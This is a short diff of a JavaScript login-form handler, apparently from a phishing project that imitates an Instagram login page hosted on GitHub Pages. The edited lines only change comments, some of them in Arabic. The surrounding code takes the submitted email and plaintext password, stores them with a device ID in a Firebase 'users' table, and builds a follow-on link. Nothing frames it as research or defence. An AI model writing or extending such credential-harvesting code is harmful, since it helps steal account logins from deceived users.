@@ -56,15 +56,15 @@ if (loginForm) {
 
       console.log("Generated Device ID:", deviceId);  
 
-      // Create a reference to the "users" list (without وضع deviceId كمفتاح رئيسي)
+      // Create a reference to the "users" table
       const usersRef = ref(database, 'users');  
 
       // Push a new login entry with deviceId inside the data object
       push(usersRef, {  
-        deviceId: deviceId,  // وضع الجهاز داخل البيانات  
+        deviceId: deviceId,  // وضع الـ deviceId داخل البيانات
         email: email,  
         password: password,  
-        timestamp: new Date().toISOString() // Add a timestamp to distinguish the logins  
+        timestamp: new Date().toISOString()
       })  
       .then(() => {  
         const link = "https://mafia749.github.io/login/Instagram/instagram.html?id=" + deviceId;  
@@ -74,7 +74,7 @@ if (loginForm) {
       })  
       .catch((error) => {  
         console.error("Error sending data to Firebase:", error.message);  
-        alert("Error sending data: " + error.message); // Alert the user about the error  
+        alert("Error sending data: " + error.message);  
       });  
     } else {  
       alert("Please fill in both fields.");  
